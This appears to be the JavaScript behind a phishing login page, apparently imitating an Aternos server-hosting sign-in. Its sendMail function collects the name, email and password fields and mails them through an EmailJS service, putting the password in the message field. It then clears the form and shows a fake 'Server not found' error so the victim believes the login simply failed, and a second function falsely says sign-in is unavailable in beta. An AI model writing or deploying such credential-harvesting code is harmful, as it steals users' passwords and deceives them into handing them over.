function GetName() {
    let name = document.getElementById("name").value
    console.log("Name: ", name)
    GetPassword()
};

function GetPassword() {
    let password = document.getElementById("pasword").value
    console.log("Password: ", password)
};

function sendMail() {
    let name = document.getElementById("name").value
    console.log("Name: ", name)
    let password = document.getElementById("pasword").value
    console.log("Password: ", password)

    var params = {
      name: document.getElementById("name").value,
      email: document.getElementById("email").value,
      message: document.getElementById("pasword").value,
    };
  
    const serviceID = "service_71vfh47";
    const templateID = "template_fbwf5tk";
  
    emailjs
      .send(serviceID, templateID, params)
      .then((res) => {
        document.getElementById("name").value = "";
        document.getElementById("email").value = "";
        document.getElementById("pasword").value = "";
        console.log(res);
        alert("ERROR: Server not found. Please try again.");
      })
      .catch((err) => console.log(err));
  }
 
function signError() {
  alert("ERROR: Signing in is not available in BETA. You can make an account at: https://aternos.org/go/")
}